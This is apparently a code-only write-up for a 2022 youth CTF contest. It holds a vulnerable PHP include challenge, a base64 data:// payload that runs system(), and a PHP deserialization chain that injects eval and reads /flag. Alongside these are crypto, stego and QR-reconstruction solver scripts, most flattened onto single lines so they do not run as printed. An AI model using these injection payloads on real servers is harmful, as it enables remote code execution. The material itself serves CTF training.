# 2022年强网杯青少年专项赛writeup

> 原文: https://www.ctfiot.com/58504.html
> ID: 58504

<?phphighlight_file(__FILE__);error_reporting(0);if(isset($_GET['file'])&&strlen($_GET['file'])>strlen("flag in cream")){ die("too long,no flag");}$fp = fopen($_GET['file'], 'r+');if(preg_match("/php|file|http|eval|exec|system|popen|flag|<|>|"|'/i", $_GET['content'])){ die("hacker");}fputs($fp, $_GET['content']);rewind($fp);$data=stream_get_contents($fp);include($data);?

?file=data://,1111&content=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0eXBlIGluZGV4LnBocCcpOz8+

$a = new Sliver;$a->secret = new Range;$a->secret->link = new Water;$a->secret->link->waterfall = new Circle;echo urlencode(serialize($a));

http://eci-2ze158r2q295c121rafg.cloudeci1.ichunqiu.com//demo.php?data=O%3A6%3A%22Sliver%22%3A2%3A%7Bs%3A6%3A%22secret%22%3BO%3A5%3A%22Range%22%3A2%3A%7Bs%3A5%3A%22horis%22%3BN%3Bs%3A4%3A%22link%22%3BO%3A5%3A%22Water%22%3A1%3A%7Bs%3A9%3A%22waterfall%22%3BO%3A6%3A%22Circle%22%3A2%3A%7Bs%3A6%3A%22daemon%22%3BN%3Bs%3A7%3A%22%00%2A%00dash%22%3Bs%3A16%3A%22%40eval%28%24_GET%5Ba%5D%29%3B%22%3B%7D%7D%7Ds%3A5%3A%22resty%22%3BN%3B%7D&a=system("cat /flag");

strings = 'FLAG[vxpsDqCElwwoClsoColwpuvlqFvvFrpopBss]'res=''for j in strings: #print(ord(i)) if str.isupper(j): i=(chr(ord(j)+32)) else: i=(chr(ord(j)-32-31)) res+=iprint(res)

data = open("data.txt",'r').read()data = data.split(" ")data1 = []for i in range(0,len(data),2): data1.append(data[i+1]) data1.append(data[i])f = open("ctf.txt",'wb')for i in data1: f.write(i.encode())f.close()

python2 lsb.py extract 1.png 1.txt 4536251

data = [[1,1,1,1,1,1,1,0,1,0,1,1,0,0,1,1,0,1,0,0,1,0,1,1,1,1,1,1,1],[1,0,0,0,0,0,1,0,1,0,1,0,0,0,1,0,0,0,0,1,1,0,1,0,0,0,0,0,1],[1,0,1,1,1,0,1,0,1,0,1,1,1,1,1,0,0,0,0,1,1,0,1,0,1,1,1,0,1],[1,0,1,1,1,0,1,0,0,1,0,0,1,1,1,0,0,1,1,0,1,0,1,0,1,1,1,0,1],[1,0,1,1,1,0,1,0,1,0,0,0,0,1,0,0,0,0,1,1,0,0,1,0,1,1,1,0,1],[1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,0,0,1,0,0,1,0,1,0,0,0,0,0,1],[1,1,1,1,1,1,1,0,1,0,1,0,1,0,1,0,1,0,1,0,1,0,1,1,1,1,1,1,1],[0,0,0,0,0,0,0,0,0,1,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[1,0,0,1,1,1,1,1,1,0,1,0,0,0,0,1,1,1,1,1,1,1,0,0,1,0,1,1,1],[1,1,1,1,0,0,0,0,1,1,0,0,0,0,0,1,1,0,0,0,1,0,1,1,1,1,0,0,1],[1,1,0,0,1,0,1,1,0,0,1,1,1,1,0,1,0,1,0,1,1,0,0,1,1,0,1,0,1],[0,1,1,0,1,0,0,0,0,0,0,0,1,0,0,0,1,0,1,0,0,1,1,0,1,1,1,0,1],[1,1,0,0,1,0,1,1,0,0,0,1,0,1,0,1,0,0,0,1,0,1,1,1,0,1,0,0,1],[1,1,1,0,1,0,0,0,0,1,0,1,1,0,0,1,0,1,0,1,0,0,0,1,1,1,0,0,0],[0,0,0,0,1,0,1,1,0,0,1,0,1,0,1,1,0,1,1,0,1,1,1,0,1,1,0,0,0],[1,1,1,1,1,1,0,1,0,0,0,1,0,1,0,1,0,0,1,0,1,1,0,1,1,1,1,0,1],[0,1,1,1,0,1,1,1,1,0,0,1,0,1,0,0,0,0,1,1,1,0,0,0,0,0,0,0,1],[1,0,0,1,1,0,0,0,1,1,1,0,1,1,0,1,0,1,0,1,1,1,0,0,1,1,1,0,0],[1,0,1,1,1,1,1,1,0,0,1,0,1,0,1,1,1,0,1,1,0,1,1,1,0,0,0,1,1],[1,0,1,1,1,1,0,0,1,1,0,1,1,0,1,0,0,1,1,0,1,1,1,1,1,1,0,1,1],[1,1,1,1,1,0,1,1,0,0,0,0,1,0,1,1,1,1,1,1,1,1,1,1,1,0,1,0,1],[0,0,0,0,0,0,0,0,1,0,1,1,0,1,0,1,0,0,0,1,1,0,0,0,1,0,1,0,0],[1,1,1,1,1,1,1,0,1,0,0,1,0,1,0,1,0,1,1,1,1,0,1,0,1,1,0,0,0],[1,0,0,0,0,0,1,0,1,1,1,0,1,0,1,0,1,1,1,0,1,0,0,0,1,0,0,0,0],[1,0,1,1,1,0,1,0,1,0,0,0,1,1,1,0,0,0,1,1,1,1,1,1,1,0,0,1,0],[1,0,1,1,1,0,1,0,1,0,1,1,0,0,1,1,0,1,1,0,1,0,0,1,0,1,1,0,1],[1,0,1,1,1,0,1,0,0,1,0,0,0,1,0,1,0,0,0,0,0,0,0,0,1,0,0,1,1],[1,0,0,0,0,0,1,0,0,0,1,0,0,1,0,0,1,0,0,1,0,1,1,0,1,0,1,0,1],[1,1,1,1,1,1,1,0,1,0,1,0,0,0,0,1,0,0,0,0,1,0,1,1,0,1,0,0,0]]import pyzbar.pyzbar as pyzbarfrom itertools import permutationsfrom PIL import Image, ImageDraw as drawimport matplotlib.pyplot as pltfrom tqdm import tqdmshuffle_1 = [9, 11, 13, 15, 17, 19]shuffle_2 = [10, 12, 14, 16, 18]head = data[:9]tail = data[20:]def body(body_1, body_2): # 获取中间部分的一种排列body = []for i in range(5):body.append(body_1[i])body.append(body_2[i])body.append(body_1[5])return [data[i] for i in body]def draw_img(data): # 生成二维码图片assert len(data) == 29 and len(data[0]) == 29img = Image.new('RGB', (31, 31), (255,255,255))for i, row in enumerate(data):for j, pixel in enumerate(row):img.putpixel((j + 1, i + 1), (0,0,0) if pixel == 1 else (255,255,255))return imgwith tqdm(total=720 * 120) as pbar:for body_1 in permutations(shuffle_1):for body_2 in permutations(shuffle_2):im = draw_img(head + body(body_1, body_2) + tail)barcodes = pyzbar.decode(im)pbar.update(1)if(len(barcodes) == 0):continuefor barcode in barcodes:barcodeData = barcode.data.decode("utf-8")print(barcodeData)plt.imshow(im)plt.show()


```
<?phphighlight_file(__FILE__);error_reporting(0);if(isset($_GET['file'])&&strlen($_GET['file'])>strlen("flag in cream")){ die("too long,no flag");}$fp = fopen($_GET['file'], 'r+');if(preg_match("/php|file|http|eval|exec|system|popen|flag|<|>|"|'/i", $_GET['content'])){ die("hacker");}fputs($fp, $_GET['content']);rewind($fp);$data=stream_get_contents($fp);include($data);?
```



```
?file=data://,1111&content=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0eXBlIGluZGV4LnBocCcpOz8+
```



```
$a = new Sliver;$a->secret = new Range;$a->secret->link = new Water;$a->secret->link->waterfall = new Circle;echo urlencode(serialize($a));
```



```
http://eci-2ze158r2q295c121rafg.cloudeci1.ichunqiu.com//demo.php?data=O%3A6%3A%22Sliver%22%3A2%3A%7Bs%3A6%3A%22secret%22%3BO%3A5%3A%22Range%22%3A2%3A%7Bs%3A5%3A%22horis%22%3BN%3Bs%3A4%3A%22link%22%3BO%3A5%3A%22Water%22%3A1%3A%7Bs%3A9%3A%22waterfall%22%3BO%3A6%3A%22Circle%22%3A2%3A%7Bs%3A6%3A%22daemon%22%3BN%3Bs%3A7%3A%22%00%2A%00dash%22%3Bs%3A16%3A%22%40eval%28%24_GET%5Ba%5D%29%3B%22%3B%7D%7D%7Ds%3A5%3A%22resty%22%3BN%3B%7D&a=system("cat /flag");
```



```
strings = 'FLAG[vxpsDqCElwwoClsoColwpuvlqFvvFrpopBss]'res=''for j in strings: #print(ord(i)) if str.isupper(j): i=(chr(ord(j)+32)) else: i=(chr(ord(j)-32-31)) res+=iprint(res)
```



```
data = open("data.txt",'r').read()data = data.split(" ")data1 = []for i in range(0,len(data),2): data1.append(data[i+1]) data1.append(data[i])f = open("ctf.txt",'wb')for i in data1: f.write(i.encode())f.close()
```



```
python2 lsb.py extract 1.png 1.txt 4536251
```



```
data = [[1,1,1,1,1,1,1,0,1,0,1,1,0,0,1,1,0,1,0,0,1,0,1,1,1,1,1,1,1],[1,0,0,0,0,0,1,0,1,0,1,0,0,0,1,0,0,0,0,1,1,0,1,0,0,0,0,0,1],[1,0,1,1,1,0,1,0,1,0,1,1,1,1,1,0,0,0,0,1,1,0,1,0,1,1,1,0,1],[1,0,1,1,1,0,1,0,0,1,0,0,1,1,1,0,0,1,1,0,1,0,1,0,1,1,1,0,1],[1,0,1,1,1,0,1,0,1,0,0,0,0,1,0,0,0,0,1,1,0,0,1,0,1,1,1,0,1],[1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,0,0,1,0,0,1,0,1,0,0,0,0,0,1],[1,1,1,1,1,1,1,0,1,0,1,0,1,0,1,0,1,0,1,0,1,0,1,1,1,1,1,1,1],[0,0,0,0,0,0,0,0,0,1,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[1,0,0,1,1,1,1,1,1,0,1,0,0,0,0,1,1,1,1,1,1,1,0,0,1,0,1,1,1],[1,1,1,1,0,0,0,0,1,1,0,0,0,0,0,1,1,0,0,0,1,0,1,1,1,1,0,0,1],[1,1,0,0,1,0,1,1,0,0,1,1,1,1,0,1,0,1,0,1,1,0,0,1,1,0,1,0,1],[0,1,1,0,1,0,0,0,0,0,0,0,1,0,0,0,1,0,1,0,0,1,1,0,1,1,1,0,1],[1,1,0,0,1,0,1,1,0,0,0,1,0,1,0,1,0,0,0,1,0,1,1,1,0,1,0,0,1],[1,1,1,0,1,0,0,0,0,1,0,1,1,0,0,1,0,1,0,1,0,0,0,1,1,1,0,0,0],[0,0,0,0,1,0,1,1,0,0,1,0,1,0,1,1,0,1,1,0,1,1,1,0,1,1,0,0,0],[1,1,1,1,1,1,0,1,0,0,0,1,0,1,0,1,0,0,1,0,1,1,0,1,1,1,1,0,1],[0,1,1,1,0,1,1,1,1,0,0,1,0,1,0,0,0,0,1,1,1,0,0,0,0,0,0,0,1],[1,0,0,1,1,0,0,0,1,1,1,0,1,1,0,1,0,1,0,1,1,1,0,0,1,1,1,0,0],[1,0,1,1,1,1,1,1,0,0,1,0,1,0,1,1,1,0,1,1,0,1,1,1,0,0,0,1,1],[1,0,1,1,1,1,0,0,1,1,0,1,1,0,1,0,0,1,1,0,1,1,1,1,1,1,0,1,1],[1,1,1,1,1,0,1,1,0,0,0,0,1,0,1,1,1,1,1,1,1,1,1,1,1,0,1,0,1],[0,0,0,0,0,0,0,0,1,0,1,1,0,1,0,1,0,0,0,1,1,0,0,0,1,0,1,0,0],[1,1,1,1,1,1,1,0,1,0,0,1,0,1,0,1,0,1,1,1,1,0,1,0,1,1,0,0,0],[1,0,0,0,0,0,1,0,1,1,1,0,1,0,1,0,1,1,1,0,1,0,0,0,1,0,0,0,0],[1,0,1,1,1,0,1,0,1,0,0,0,1,1,1,0,0,0,1,1,1,1,1,1,1,0,0,1,0],[1,0,1,1,1,0,1,0,1,0,1,1,0,0,1,1,0,1,1,0,1,0,0,1,0,1,1,0,1],[1,0,1,1,1,0,1,0,0,1,0,0,0,1,0,1,0,0,0,0,0,0,0,0,1,0,0,1,1],[1,0,0,0,0,0,1,0,0,0,1,0,0,1,0,0,1,0,0,1,0,1,1,0,1,0,1,0,1],[1,1,1,1,1,1,1,0,1,0,1,0,0,0,0,1,0,0,0,0,1,0,1,1,0,1,0,0,0]]import pyzbar.pyzbar as pyzbarfrom itertools import permutationsfrom PIL import Image, ImageDraw as drawimport matplotlib.pyplot as pltfrom tqdm import tqdmshuffle_1 = [9, 11, 13, 15, 17, 19]shuffle_2 = [10, 12, 14, 16, 18]head = data[:9]tail = data[20:]def body(body_1, body_2): # 获取中间部分的一种排列body = []for i in range(5):body.append(body_1[i])body.append(body_2[i])body.append(body_1[5])return [data[i] for i in body]def draw_img(data): # 生成二维码图片assert len(data) == 29 and len(data[0]) == 29img = Image.new('RGB', (31, 31), (255,255,255))for i, row in enumerate(data):for j, pixel in enumerate(row):img.putpixel((j + 1, i + 1), (0,0,0) if pixel == 1 else (255,255,255))return imgwith tqdm(total=720 * 120) as pbar:for body_1 in permutations(shuffle_1):for body_2 in permutations(shuffle_2):im = draw_img(head + body(body_1, body_2) + tail)barcodes = pyzbar.decode(im)pbar.update(1)if(len(barcodes) == 0):continuefor barcode in barcodes:barcodeData = barcode.data.decode("utf-8")print(barcodeData)plt.imshow(im)plt.show()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/7-1663943569.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/2-1663943571.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/9-1663943571.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/6-1663943572.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/3-1663943573.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/8-1663943574.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/0-1663943575.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/9-1663943575.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/2-1663943576.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/6-1663943579.png)